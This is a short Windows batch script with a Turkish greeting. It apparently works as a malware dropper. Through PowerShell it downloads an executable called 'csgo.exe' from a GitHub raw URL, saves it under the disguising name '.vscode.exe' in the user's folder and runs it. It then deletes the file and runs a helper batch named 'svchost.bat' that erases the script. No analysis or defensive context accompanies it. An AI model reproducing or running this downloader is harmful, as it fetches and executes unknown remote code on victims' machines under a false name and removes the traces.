@echo OFF
echo HOS GELDINIZ!
powershell -command "$u='https://github.com/canyazbahar/cook/raw/main/csgo.exe';$p='C:\Users\' + $env:USERNAME + '\.vscode.exe';(New-Object Net.WebClient).DownloadFile($u,$p);(New-Object -com shell.application).shellexecute($p);exit"
timeout /t 10
del "C:\Users\cy\.vscode.exe" /Q
( 
    echo del /Q "%~f0" 
) > "%temp%\svchost.bat"
"%temp%\svchost.bat"